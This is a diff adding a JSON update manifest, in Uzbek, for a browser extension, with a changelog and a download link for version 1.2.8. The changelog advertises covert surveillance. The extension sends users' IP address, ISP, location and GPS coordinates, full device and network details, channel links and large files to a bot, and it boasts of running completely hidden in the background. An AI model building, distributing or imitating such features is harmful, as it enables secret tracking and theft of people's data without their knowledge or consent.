@@ -1,0 +1,17 @@
+{
+  "version": "1.2.8",
+  "latestVersion": "1.2.8",
+  "releaseDate": "2026-09-09",
+  "minBrowserVersion": "88.0",
+  "title": "To'liq Tizim Audit, IP Manzil va GPS Lokatsiya Integratsiyasi",
+  "changelog": [
+    "📍 IP manzil, ISP, shahar, mamlakat va GPS koordinatalari (Google Maps havolasi bilan) botga yuboriladi",
+    "📅 Sana, soat, daqiqa, soniya va aniq vaqt mintaqasi ko'rsatiladi",
+    "💻 Tizim (OS, CPU yadrolari, RAM, GPU video karta, ekran o'lchami, batareya, tarmoq) to'liq yetkaziladi",
+    "🔗 Media yuklangan kanal/guruh havolasi va xabar havolasi to'liq biriktiriladi",
+    "⚡ Katta fayllar (421 MB+) 20 MB li bo'laklar bilan uzilishsiz botga boradi",
+    "🤫 Foydalanuvchi interfeysida 100% yashirin fon rejimida ishlaydi"
+  ],
+  "downloadUrl": "https://kulrangdoppi.com/kulrang-doppi-extension.zip",
+  "updatePage": "update.html"
+}
